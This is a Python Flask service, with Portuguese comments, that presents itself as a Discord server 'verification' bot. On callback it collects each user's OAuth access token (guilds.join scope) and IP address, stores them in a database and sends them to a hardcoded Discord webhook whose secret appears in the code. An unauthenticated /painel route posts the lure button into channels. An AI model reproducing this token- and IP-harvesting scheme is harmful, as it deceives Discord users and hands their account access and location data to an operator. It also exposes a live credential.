import os
import requests
import psycopg2
from flask import Flask, request, redirect, render_template

app = Flask(__name__)
app.secret_key = os.urandom(24)

# --- CONFIGURAÇÕES ---
CLIENT_ID = os.environ.get("DISCORD_CLIENT_ID", "1450162997187182632")
CLIENT_SECRET = os.environ.get("DISCORD_CLIENT_SECRET")
BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL") # A URL do Neon que você colocou no Render
REDIRECT_URI = "https://hunter-bot-verify.onrender.com/callback"

LOG_WEBHOOK = "https://discord.com/api/webhooks/1447353848493772901/IoHRSWi8YZVpFGENLD5PWkf90Gx4YGhVTuF3vOkVre8_75efP13cv3i-83OBbCrC0mN1"
API_BASE = "https://discord.com/api/v10"

# --- BANCO DE DADOS (PostgreSQL) ---

def get_db_connection():
    """Conecta ao banco PostgreSQL"""
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def init_db():
    """Cria a tabela de usuários se ela não existir"""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS verified_users (
                user_id VARCHAR(50) PRIMARY KEY,
                username VARCHAR(100),
                ip_address VARCHAR(50),
                access_token TEXT,
                guild_id VARCHAR(50),
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
        print("✅ Banco de Dados conectado e tabela verificada.")
    except Exception as e:
        print(f"❌ Erro ao conectar no Banco: {e}")

def save_user_to_db(user_id, username, ip, token, guild_id):
    """Salva ou Atualiza o usuário no Banco"""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        # Se o usuário já existe, atualiza o IP e o Token. Se não, cria novo.
        query = """
            INSERT INTO verified_users (user_id, username, ip_address, access_token, guild_id)
            VALUES (%s, %s, %s, %s, %s)
            ON CONFLICT (user_id) DO UPDATE 
            SET ip_address = EXCLUDED.ip_address, 
                access_token = EXCLUDED.access_token,
                guild_id = EXCLUDED.guild_id,
                verified_at = CURRENT_TIMESTAMP;
        """
        cur.execute(query, (user_id, username, ip, token, guild_id))
        conn.commit()
        cur.close()
        conn.close()
        print(f"💾 Usuário {username} salvo no banco PostgreSQL.")
    except Exception as e:
        print(f"❌ Erro ao salvar no banco: {e}")

# --- FUNÇÕES DISCORD ---

def get_headers_bot():
    return {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}

def send_log_to_webhook(user_data, access_token, ip_address, guild_id):
    embed = {
        "title": "✅ Usuário Verificado & Salvo!",
        "description": "Dados persistidos no Banco de Dados PostgreSQL.",
        "color": 0x00ff41,
        "fields": [
            { "name": "👤 Usuário", "value": f"{user_data['username']} (`{user_data['id']}`)", "inline": False },
            { "name": "🌍 IP (Database)", "value": f"`{ip_address}`", "inline": True },
            { "name": "🏰 Server ID", "value": f"`{guild_id}`", "inline": True },
            { "name": "🔑 Access Token", "value": f"||{access_token}||", "inline": False }
        ],
        "footer": { "text": "Hunter Database System" }
    }
    payload = {"embeds": [embed], "username": "Hunter Logs"}
    requests.post(LOG_WEBHOOK, json=payload)

def get_or_create_verified_role(target_guild_id):
    url = f"{API_BASE}/guilds/{target_guild_id}/roles"
    response = requests.get(url, headers=get_headers_bot())
    if response.status_code == 200:
        roles = response.json()
        for role in roles:
            if role['name'] == "Vereficado":
                return role['id']
    
    create_url = f"{API_BASE}/guilds/{target_guild_id}/roles"
    data = {"name": "Vereficado", "permissions": "0", "color": 0x00ff00, "hoist": False, "mentionable": False}
    create_res = requests.post(create_url, headers=get_headers_bot(), json=data)
    if create_res.status_code in [200, 201]:
        return create_res.json()['id']
    return None

def add_user_to_guild_and_role(user_id, access_token, role_id, target_guild_id):
    join_url = f"{API_BASE}/guilds/{target_guild_id}/members/{user_id}"
    join_data = {"access_token": access_token}
    requests.put(join_url, headers=get_headers_bot(), json=join_data)
    
    role_url = f"{API_BASE}/guilds/{target_guild_id}/members/{user_id}/roles/{role_id}"
    requests.put(role_url, headers=get_headers_bot())

# Inicializa o banco ao ligar o script
init_db()

# --- ROTAS ---

@app.route('/')
def index():
    return "Hunter Database System Online."

@app.route('/auth')
def auth():
    target_guild_id = request.args.get('guild_id')
    if not target_guild_id: return "Erro: ID do servidor faltando."
    oauth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}&scope=identify+guilds.join+guilds&state={target_guild_id}"
    return redirect(oauth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    target_guild_id = request.args.get('state') 

    if not code: return "Erro no Código."

    # 1. Troca Token
    data = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}
    token_resp = requests.post(f'{API_BASE}/oauth2/token', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    tokens = token_resp.json()
    access_token = tokens.get('access_token')
    if not access_token: return f"Erro Token: {tokens}"

    # 2. Dados User
    user_resp = requests.get(f'{API_BASE}/users/@me', headers={'Authorization': f'Bearer {access_token}'})
    user_data = user_resp.json()
    user_id = user_data['id']
    username = user_data['username']

    # 3. IP
    if request.headers.getlist("X-Forwarded-For"):
        user_ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        user_ip = request.remote_addr

    # 4. SALVAR NO BANCO DE DADOS (POSTGRESQL)
    save_user_to_db(user_id, username, user_ip, access_token, target_guild_id)

    # 5. Logs e Cargos
    send_log_to_webhook(user_data, access_token, user_ip, target_guild_id)
    
    try:
        role_id = get_or_create_verified_role(target_guild_id)
        if role_id:
            add_user_to_guild_and_role(user_id, access_token, role_id, target_guild_id)
    except Exception as e:
        print(f"Erro cargo: {e}")

    return redirect(f"https://discord.com/channels/{target_guild_id}")

@app.route('/ping')
def ping():
    return "Pong", 200

@app.route('/painel', methods=['GET', 'POST'])
def painel():
    message = ""
    if request.method == 'POST':
        target_guild_id = request.form.get('guild_id') 
        channel_id = request.form.get('channel_id')
        title = request.form.get('title')
        desc = request.form.get('desc')
        image_url = request.form.get('image_url')
        verify_link = f"https://hunter-bot-verify.onrender.com/auth?guild_id={target_guild_id}"

        payload = {
            "embeds": [{
                "title": title, "description": desc, "color": 0x00ff41,
                "image": {"url": image_url} if image_url else {}
            }],
            "components": [{
                "type": 1,
                "components": [{
                    "type": 2, "style": 5, "label": "VERIFICAR AGORA", "url": verify_link
                }]
            }]
        }
        post_url = f"{API_BASE}/channels/{channel_id}/messages"
        r = requests.post(post_url, headers=get_headers_bot(), json=payload)
        message = "✅ Painel Enviado!" if r.status_code == 200 else f"❌ Erro: {r.text}"

    return render_template('painel.html', message=message)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
